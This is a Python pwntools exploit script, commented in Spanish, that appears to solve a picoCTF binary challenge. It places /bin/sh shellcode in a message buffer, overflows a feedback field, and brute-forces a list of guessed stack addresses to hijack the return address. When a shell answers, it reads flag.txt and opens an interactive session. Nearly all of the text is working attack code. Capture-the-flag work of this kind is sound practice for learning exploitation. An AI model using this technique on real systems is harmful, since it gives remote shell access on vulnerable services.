#!/usr/bin/env python3
"""
Estrategia MUY SIMPLE: Shellcode directo

El stack es ejecutable. Voy a:
1. Colocar shellcode en entries[0].msg
2. Usar feedback overflow para saltar a una dirección del stack
3. Probar direcciones comunes o hacer bruteforce

Sin ASLR o con ASLR débil, esto debería funcionar.
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = 'shape-facility.picoctf.net'
PORT = 63529

# Generar shellcode
shellcode = asm(shellcraft.sh())
log.info(f"Shellcode ({len(shellcode)} bytes): {shellcode.hex()}")

io = remote(HOST, PORT)

# Agregar una entrada con shellcode
io.sendlineafter(b'Exit the app\n', b'1')
io.sendlineafter(b'name: \n', b'AAAA')

# Enviar shellcode en el mensaje
io.sendlineafter(b'Exit the app\n', b'2')
io.sendlineafter(b'message to?\n', b'0')
io.sendlineafter(b'send them?\n', shellcode)

# Probar direcciones del stack
# En sistemas típicos sin ASLR full, el stack está alrededor de 0x7ffffffde000
# Con ASLR, los últimos 3 nibbles varían

# Probar una dirección típica
# entries[0].msg debería estar en rbp-728
# rbp típicamente está alrededor de 0x7fffffffdxxx
stack_addrs = [
    0x7fffffffdb00,
    0x7fffffffdc00,
    0x7fffffffdd00,
    0x7fffffffd800,
    0x7fffffffd900,
    0x7fffffffda00,
]

for addr in stack_addrs:
    log.info(f"Intentando con dirección: {hex(addr)}")
    
    try:
        # Reabrir conexión
        if io.closed:
            io = remote(HOST, PORT)
            io.sendlineafter(b'Exit the app\n', b'1')
            io.sendlineafter(b'name: \n', b'BBBB')
            io.sendlineafter(b'Exit the app\n', b'2')
            io.sendlineafter(b'message to?\n', b'0')
            io.sendlineafter(b'send them?\n', shellcode)
        
        payload = b'A' * 8 + b'B' * 4 + b'C' * 8 + p64(addr)
        assert len(payload) <= 32
        
        io.sendlineafter(b'Exit the app\n', b'3')
        io.sendlineafter(b'appreciate it: \n', payload)
        
        # Intentar ejecutar comando
        io.sendline(b'echo SHELLTEST')
        response = io.recv(timeout=1)
        
        if b'SHELLTEST' in response:
            log.success("¡SHELL OBTENIDA!")
            io.sendline(b'cat flag.txt')
            io.sendline(b'ls -la')
            io.interactive()
            break
    except:
        log.warning(f"Falló con {hex(addr)}")
        continue

io.close()
